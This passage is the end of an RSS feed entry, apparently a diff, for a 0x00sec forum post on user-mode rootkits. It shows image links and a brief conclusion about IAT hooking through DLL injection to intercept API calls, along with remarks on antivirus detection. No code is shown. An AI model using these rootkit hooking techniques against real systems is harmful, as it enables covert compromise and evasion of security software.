+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/f/fbb23456fb1d34bc0904a805210d0b50686516d9.PNG" width="644" height="266"></p>
+<p>or…</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/e/e8a71e082011e60f149b53164a8b37fcf4288d46.PNG" width="520" height="307"></p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/d/d50be8e3c6427c82195110916045b70dcce29b9a.PNG" width="622" height="332"></p>
+<hr>
+<h2>Conclusion</h2>
+<p>So there we have it, IAT hooking with DLL injections to intercept API function calls. There are other ways to hook the function such as placing a direct jump to the hook function but I found that this particular method was easier to implement. This is a pretty well-known technique so don’t expect this to work in every scenario and not get caught by antivirus.</p>
+<p>Hope that you’ve all enjoyed and learned something from this. Until next time.</p>
+<p><em>– dtm</em></p>
+          <p><a href="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108/1</link>
+        <pubDate>Sun, 18 Sep 2016 04:16:15 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1108-1</guid>
+        <source url="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108.rss">User Mode Rootkits: IAT and Inline Hooking</source>
+      </item>
+  </channel>
+</rss>
